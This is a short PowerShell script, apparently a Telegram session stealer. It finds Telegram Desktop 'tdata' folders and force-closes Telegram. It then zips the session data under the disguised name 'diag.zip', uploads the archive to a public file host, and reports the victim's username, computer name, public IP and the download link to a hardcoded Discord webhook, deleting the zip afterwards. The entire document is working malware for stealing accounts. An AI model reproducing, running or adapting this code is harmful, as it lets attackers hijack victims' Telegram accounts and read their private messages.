$webhook = 'https://discord.com/api/webhooks/1529082055714144276/gLKHwTckMgB8SlrhIh_jYEour-5zoFrKK7R4d18sQ5qroCYB8gQejCbKYwttIM8-TXE8'

$paths = @()
@("$env:APPDATA\Telegram Desktop\tdata", "$env:APPDATA\Telegram Desktop Beta\tdata") | ForEach-Object {
    if (Test-Path $_) { $paths += $_ }
}
if ($paths.Count -eq 0) {
    curl.exe -F "content=❌ tdata not found" $webhook
    exit
}

Get-Process -Name Telegram -ErrorAction SilentlyContinue | Stop-Process -Force

$zip = "$env:TEMP\diag.zip"
Compress-Archive -Path $paths -DestinationPath $zip -Force

$user = $env:USERNAME
$comp = $env:COMPUTERNAME
$ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content.Trim()

$upload = Invoke-WebRequest -Uri 'https://0x0.st' -Method Post -Form @{ file = Get-Item $zip }
$link = $upload.Content.Trim()

curl.exe -F "content=$user@$comp | IP: $ip | Download: $link" $webhook

Remove-Item $zip -Force
